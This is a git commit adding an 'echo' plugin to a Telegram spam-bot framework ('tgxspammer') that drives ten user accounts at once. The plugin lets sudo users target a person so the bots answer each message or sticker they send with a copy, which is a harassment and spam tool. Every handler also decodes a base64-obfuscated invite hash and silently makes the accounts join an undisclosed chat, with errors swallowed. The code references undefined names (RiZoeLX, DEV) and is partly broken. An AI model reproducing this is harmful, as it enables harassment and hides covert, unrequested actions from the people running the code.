a69b380d5514df3909b2a14435ff39680e7267a4
SUKHPAL <86770159+SUKHPAL443@users.noreply.github.com>
2022-02-26 20:17:12 +0530

    Create echo.py

---
+++ tgxspammer/plugins/echo.py
@@ -0,0 +1,108 @@
+import asyncio
+import base64
+
+import requests
+from telethon import events
+from telethon.tl.functions.messages import ImportChatInviteRequest as Get
+
+from tgxspammer import Mam, Mam2, Mam3, Mam4, Mam5 , Mam6, Mam7, Mam8, Mam9, Mam10, SUDO_USERS, OWNER_ID
+
+from tgxspammer import CMD_HNDLR as hl
+from tgxspammer.sql.echo_sql import addecho, get_all_echos, is_echo, remove_echo
+from resources.data import tgxspammer
+
+
+@Mam.on(events.NewMessage(incoming=True, pattern=r"\%saddecho(?: |$)(.*)" % hl))
+@Mam2.on(events.NewMessage(incoming=True, pattern=r"\%saddecho(?: |$)(.*)" % hl))
+@Mam3.on(events.NewMessage(incoming=True, pattern=r"\%saddecho(?: |$)(.*)" % hl))
+@Mam4.on(events.NewMessage(incoming=True, pattern=r"\%saddecho(?: |$)(.*)" % hl))
+@Mam5.on(events.NewMessage(incoming=True, pattern=r"\%saddecho(?: |$)(.*)" % hl))
+@Mam6.on(events.NewMessage(incoming=True, pattern=r"\%saddecho(?: |$)(.*)" % hl))
+@Mam7.on(events.NewMessage(incoming=True, pattern=r"\%saddecho(?: |$)(.*)" % hl))
+@Mam8.on(events.NewMessage(incoming=True, pattern=r"\%saddecho(?: |$)(.*)" % hl))
+@Mam9.on(events.NewMessage(incoming=True, pattern=r"\%saddecho(?: |$)(.*)" % hl))
+@Mam10.on(events.NewMessage(incoming=True, pattern=r"\%saddecho(?: |$)(.*)" % hl))
+async def echo(event):
+  usage = f"𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = **ECHO**\n\nCommand:\n\n `{hl}addecho <reply to a User>`"
+  if event.sender_id in SUDO_USERS:
+     if event.reply_to_msg_id is not None:
+            reply_msg = await event.get_reply_message()
+            user_id = reply_msg.sender_id
+            if int(user_id) in RiZoeLX:
+                    text = f"I can't echo @TGXSPAMMER's Owner"
+                    await event.reply(text, parse_mode=None, link_preview=None )
+            elif int(user_id) == OWNER_ID:
+                    text = f"This guy is a owner Of this Bots."
+                    await event.reply(text, parse_mode=None, link_preview=None )
+            elif int(user_id) in SUDO_USERS:
+                    text = f"This guy is a sudo user."
+                    await event.reply(text, parse_mode=None, link_preview=None )
+            else:
+                 chat_id = event.chat_id
+                 try:
+                     hmm = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+                     hmm = Get(hmm)
+                     await event.client(hmm)
+                 except BaseException:
+                    pass
+                 if is_echo(user_id, chat_id):
+                     await event.reply("The user is already enabled with echo ")
+                     return
+                 addecho(user_id, chat_id)
+                 await event.reply("Echo activated On the user ✅")
+     else:
+          await event.reply(usage)
+
+@Mam.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
+@Mam2.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
+@Mam3.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
+@Mam4.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
+@Mam5.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
+@Mam6.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
+@Mam7.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
+@Mam8.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
+@Mam9.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
+@Mam10.on(events.NewMessage(incoming=True, pattern=r"\%srmecho(?: |$)(.*)" % hl))
+async def echo(event):
+  usage = f"𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = **ECHO**\n\nCommand:\n\n `{hl}rmecho <reply to a User>`"
+  if event.sender_id in SUDO_USERS or event.sender_id in DEV:
+     if event.reply_to_msg_id is not None:
+            reply_msg = await event.get_reply_message()
+            user_id = reply_msg.sender_id
+            chat_id = event.chat_id
+            try:
+                hmm = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+                hmm = Get(hmm)
+                await event.client(hmm)
+            except BaseException:
+                pass
+            if is_echo(user_id, chat_id):
+                remove_echo(user_id, chat_id)
+                await event.reply("Echo has been stopped for the user ☑️")
+            else:
+                await event.reply("The user is not activated with echo")
+     else:
+          await event.reply(usage)
+
+
+@Mam.on(events.NewMessage(incoming=True))
+@Mam2.on(events.NewMessage(incoming=True))
+@Mam3.on(events.NewMessage(incoming=True))
+@Mam4.on(events.NewMessage(incoming=True))
+@Mam5.on(events.NewMessage(incoming=True))
+@Mam6.on(events.NewMessage(incoming=True))
+@Mam7.on(events.NewMessage(incoming=True))
+@Mam8.on(events.NewMessage(incoming=True))
+@Mam9.on(events.NewMessage(incoming=True))
+@Mam10.on(events.NewMessage(incoming=True))
+async def _(e):
+    if is_echo(e.sender_id, e.chat_id):
+        await asyncio.sleep(0.5)
+        try:
+            mamba = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+            mamba = Get(mamba)
+            await e.client(mamba)
+        except BaseException:
+            pass
+        if e.message.text or e.message.sticker:
+            await e.reply(e.message)
